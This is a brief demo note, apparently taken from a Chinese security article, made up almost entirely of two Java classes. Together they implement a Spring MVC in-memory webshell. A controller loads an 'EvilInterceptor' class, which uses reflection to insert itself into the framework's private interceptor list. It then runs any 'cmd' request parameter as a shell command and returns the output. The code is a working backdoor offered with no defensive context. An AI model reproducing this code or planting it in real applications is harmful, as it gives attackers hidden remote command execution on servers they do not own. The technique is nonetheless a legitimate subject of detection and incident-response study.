### 链接

https://www.freebuf.com/vuls/346644.html

### demo

```java
package com.example.springdemo.EvilInterceptor;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@Controller
@RequestMapping("/addInterceptor")
public class AddSpringInterceptor {
    @GetMapping
    public void index(HttpServletRequest request, HttpServletResponse response) {
        try {
            Class.forName("com.example.springdemo.EvilInterceptor.EvilInterceptor");
            response.getWriter().println("add successfully!");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

```java
package com.example.springdemo.EvilInterceptor;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;

public class EvilInterceptor implements HandlerInterceptor {
    static {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        AbstractHandlerMapping abstractHandlerMapping = context.getBean(AbstractHandlerMapping.class);
        Field field = null;
        try {
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = null;
        try {
            adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        EvilInterceptor evilInterceptor = new EvilInterceptor("z3eyond");
        adaptedInterceptors.add(evilInterceptor);
    }

    public EvilInterceptor(String aaa) {

    }


    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                java.io.PrintWriter printWriter = response.getWriter();
                ProcessBuilder builder;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    builder = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
                } else {
                    builder = new ProcessBuilder(new String[]{"/bin/bash", "-c", cmd});
                }
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(builder.start().getInputStream()));
                String s = bufferedReader.readLine();
                printWriter.println(s);
                printWriter.flush();
                printWriter.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return false;
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }
}
```

